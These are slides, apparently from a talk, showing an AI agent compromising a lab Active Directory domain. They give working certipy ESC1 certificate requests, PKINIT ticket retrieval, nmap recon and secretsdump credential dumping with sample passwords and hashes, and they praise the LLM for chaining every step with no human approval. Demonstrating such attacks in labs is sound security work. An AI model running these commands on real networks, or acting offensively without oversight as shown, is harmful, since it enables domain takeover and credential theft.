---

<!-- Slide 46 from Harry's PPT — Ch5 Operation · STAGE 1 · certipy req → da_alice.pfx -->

<div class="op-header">
<span>// OPERATION ATHENA-CERT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1"><code>certipy req → da_alice.pfx</code></div>
<div class="slide-sub">整個過程合法走 ADCS API，CA 自己蓋章的。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  certipy-ad</div>

```bash
$ certipy req \
      -u legacy_kev@corp.athena.lab \
      -p 'M0nk3y!B@n4n4#99' \
      -ca CORP-CA -template VulnTemplate1 \
      -upn da_alice@corp.athena.lab

[*] Successfully requested certificate
[*] Saved certificate and private key to da_alice.pfx
```

</div>

<div class="bridge-bottom" style="margin-top: 1rem;">
我們真的找到 ESC1 嗎？下一張用 <code>certipy find</code> 證明給你看 →
</div>

---
transition: fade
---

<!-- Slide 47 from Harry's PPT — Ch5 Operation · STAGE 1 · ESC1 三條件 -->

<div class="slide-eyebrow">STAGE 1 / ESC1-PROOF</div>
<div class="slide-h1">ADCS ESC1 — <code>certipy find</code> 三條件</div>
<div class="slide-sub">三條件 AND 即 ESC1 — <code>certipy find -vulnerable</code> 自動標出</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Enrollee Supplies Subject = True</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">模板 flag <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> — 申請者自填 SAN，CA 不驗證。這是設計選項，不是 bug。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">msPKI-Certificate-Name-Flag: 0x1 (ENROLLEE_SUPPLIES_SUBJECT)</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Client Authentication EKU</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">EKU 含 <code>1.3.6.1.5.5.7.3.2</code> → 簽出來的憑證可拿去 Kerberos PKINIT 換 TGT。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">pkiextendedkeyusage: Client Authentication</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Low-priv enroll 權限</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">Authenticated Users 或 Domain Users 有 Enroll ACE — 任何網域帳號都能申請。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">Enrollment Rights: CORP\Domain Users — Allow</div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 48 from Harry's PPT — Ch5 Operation · STAGE 1 · certipy auth → da_alice TGT (DA reached) -->

<div class="op-header">
<span>// OPERATION ATHENA-DA</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1"><code>certipy auth → da_alice TGT</code> <span class="status elevated">ELEVATED</span></div>
<div class="slide-sub">**da_alice@corp** <span class="status elevated">ELEVATED</span> · ★ DOMAIN ADMIN</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node exploit"><div class="label">PFX</div><div class="sub">da_alice</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">PKINIT</div><div class="sub">via certipy</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">TGT</div><div class="sub">da_alice</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">★ DA</div><div class="sub">domain admin</div></div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
寫入 facts: <code>access.kerberos_ticket.da_alice</code> · NT hash dumped · 下一步 → ACCT-DB01
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DC-01</div>

```bash {1|2|3|4|5|6|7|all}
[21:08:12] ● PFX → TGT
[21:08:13]   certipy auth
[21:08:14]   -pfx da_alice.pfx
[21:08:21] ● TICKET    da_alice@corp
[21:08:22] ● ★ DOMAIN ADMIN
[21:08:23] ● fact saved access.kerberos_ticket
[21:08:24] ● NEXT      → STAGE 2
```

</div>
</div>

---
transition: fade
---

<!-- Slide 49 from Harry's PPT — Ch5 Operation · STAGE 1 · DC-01 攻陷 (DA achieved) -->

<div class="op-header">
<span>// OPERATION ATHENA-DC-PWN</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · DONE</div>
<div class="slide-h1">DC-01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**DC-01** <span class="status compromised">COMPROMISED</span> · 2 credentials / 1 vulnerability</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">WEB01</div><div class="sub">RCE ✓</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node attacker"><div class="label">DC-01</div><div class="sub">DA ✓</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">next</div></div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
Kill chain: <code>T1558.004</code> → <code>T1110.002</code> → <code>T1649</code> · 三段全自動串接，無人類批准。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:09:47</div>

```bash {1|2|3|4|5|6|7|all}
[21:09:47] ● TARGET    DC-01 / 192.168.0.16
[21:09:47] ● KILL CHAIN
[21:09:47]   T1558.004 ↓
[21:09:47]   T1110.002 ↓
[21:09:47]   T1649
[21:09:47] ● GAINED    domain admin
[21:09:47] ● ★ COMPROMISED · Δ +8m14s
```

</div>
</div>

---
transition: fade
---

<!-- Slide 50 from Harry's PPT — Ch5 Operation · STAGE 2 · ACCT-DB01 OBSERVE -->

<div class="op-header">
<span>// OPERATION ATHENA-PIVOT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · OBSERVE</div>
<div class="slide-h1">ACCT-DB01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**ACCT-DB01** <span class="status scanning">SCANNING</span> · 192.168.0.23 · MSSQL 14.0</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p 1433,445 192.168.0.23</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">port 1433 (MSSQL) / 445 (SMB) OPEN</span>
<span class="tag">found</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">DA 已在手 → 直接走 admin_share 取 hash</span>
<span class="tag">pivot</span>
</div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
Admin path: ✓ DA in 手 / ✓ SMB on 445 → secretsdump 計畫已成形。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · ACCT-DB01</div>

```bash {1|2|3|4|5|6|all}
[21:09:50] ● OODA      > OBSERVE
[21:09:53] ● PORT 1433 MSSQL
[21:09:53] ● PORT 445  SMB
[21:09:55] ● ADMIN PATH
[21:09:55]   ✓ DA in 手
[21:09:55]   ✓ SMB on 445
[21:09:56] ● → secretsdump
```

</div>
</div>

---
transition: fade
---

<!-- Slide 51 from Harry's PPT — Ch5 Operation · STAGE 2 · secretsdump 原理 -->

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · PRINCIPLE</div>
<div class="slide-h1"><code>secretsdump</code>：DA 想要什麼有什麼</div>
<div class="slide-sub">MITRE ATT&CK · T1003.003</div>

<div class="kill-chain compact" style="margin: 1.4rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 9rem;">
<div class="label">▌ ACCESS</div>
<div class="sub">DA 透過 SMB<br/>連到 ADMIN$ + IPC$<br/>（合法管理員權限）</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 9rem;">
<div class="label">▌ EXTRACT</div>
<div class="sub">讀取 SAM hive +<br/>LSA secrets +<br/>DPAPI master keys</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 9rem;">
<div class="label">▌ RESULT</div>
<div class="sub">本機帳號 NT hash<br/>+ 服務帳號明文密碼<br/>+ 機器帳號</div>
</div>

</div>

<div class="danger-box" style="margin-top: 1.4rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ 為何防火牆無感</div>
<div style="font-size: 1rem; line-height: 1.5;">
走 SMB 445。Windows 把它當作日常檔案分享流量，看不出是攻擊。
</div>
</div>

---
transition: fade
---

<!-- Slide 52 from Harry's PPT — Ch5 Operation · STAGE 2 · secretsdump 輸出 -->

<div class="op-header">
<span>// OPERATION ATHENA-SECRETS</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · ACT</div>
<div class="slide-h1"><code>secretsdump</code> 輸出 <span class="status dumped">DUMPED</span></div>
<div class="slide-sub">服務帳號明文密碼也一起噴出來。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  impacket-ad:secretsdump</div>

```bash
$ secretsdump.py corp/da_alice@192.168.0.23 -k

[*] Service RemoteRegistry is in stopped state
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b...:8846f7eaee...
[*] Dumping cached domain logon information
[*] Dumping LSA Secrets
$MACHINE.ACC:plain_password_hex
mssql_svc:Sup3rS3cret!2026   ← 服務帳號明文
...[truncated]
```

</div>

<div class="alert-box" style="margin-top: 0.8rem;">
寫入 facts: <code>access.local_admin · service.mssql_pass</code>
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DUMP</div>

```bash {1|2|3|4|5|6|7|all}
[21:11:08] ● TOOL      impacket-ad:secretsdump
[21:11:09] ● PROTO     SMB / 445
[21:12:43] ● DUMPED    SAM hashes
[21:12:43]            LSA secrets
[21:12:43]            service.mssql_pass
[21:12:44] ● fact saved access.local_admin
[21:12:45] ● NEXT      → MISSION
```

</div>
</div>

---
transition: fade
---

<!-- Slide 53 from Harry's PPT — Ch5 Operation · STAGE 2 · ACCT-DB01 攻陷 (Mission Complete · War Room image2) -->

<div class="op-header">
<span>// OPERATION ATHENA-OODA-26</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 2 / ACCT-DB01 · DONE</div>
<div class="slide-h1">ACCT-DB01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**ALL TARGETS** <span class="status compromised">COMPROMISED</span> · 全程 < 20 分鐘</div>

![War Room — OODA #26](/image2.png)

<div class="alert-box" style="margin-top: 0.8rem;">
War Room timeline: WEB01 (Δ+7m27s) → DC-01 (Δ+8m14s) → ACCT-DB01 (Δ+4m21s) — OODA #26 全程可重播、可審計。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:14:02</div>

```bash {1|2|3|4|5|6|7|all}
[21:14:02] ● TARGET    ACCT-DB01
[21:14:02] ● GAINED    local admin
[21:14:02]            mssql sa
[21:14:02]            財務資料
[21:14:02] ──────────
[21:14:02] ● MISSION   COMPLETE
[21:14:02]   3 / 3 targets · 全自動執行
```

<div style="margin-top: 0.4rem; padding: 0 0.8rem 0.6rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; color: var(--accent-red); text-shadow: 0 0 8px var(--accent-red-glow);">
<strong>OODA ITERATIONS · #26</strong>
</div>

</div>
</div>

---
transition: fade
---

<!-- Slide 54 from Harry's PPT — Ch5 Operation · MISSION COMPLETE · 完全靠 AD 設定錯誤 + AI 自動串接 -->

<div class="slide-eyebrow">MISSION / COMPLETE</div>
<div class="slide-h1">Mission Complete</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 1rem; margin-top: 1.4rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--accent-green); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-green); line-height: 1;">20 min</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">全程耗時</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-red); line-height: 1;">3 / 3</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">靶機攻陷</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-amber); line-height: 1;">0</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">人工介入</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-blue); border-radius: 6px; padding: 1rem; text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--accent-blue); line-height: 1;">100%</div>
<div style="color: var(--fg); font-size: 1rem; margin-top: 0.5rem;">信心可解釋</div>
</div>

</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 1rem 1.2rem; margin-top: 1.4rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 0.9rem; margin-bottom: 0.6rem;">▌ KILL CHAIN</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-amber); font-size: 0.95rem; margin-bottom: 0.6rem;">
T1190 (RCE) → T1558.004 (AS-REP) → T1110.002 (offline crack) → T1649 (ADCS ESC1) → T1003.003 (secretsdump)
</div>
<div style="color: var(--fg); font-size: 1rem; line-height: 1.5;">
每一步都是 LLM 自行決定，根據前一步寫入 Facts DB 的事實。<br/>
沒有任何環節依賴密碼弱、依賴 0day、依賴運氣。
</div>
</div>

<div class="bridge-bottom" style="margin-top: 1rem; border-left-color: var(--accent-amber); background: rgba(240, 136, 62, 0.10);">
<strong style="color: var(--accent-amber);">完全靠 AD 設定錯誤 + AI 自動串接。</strong>
</div>
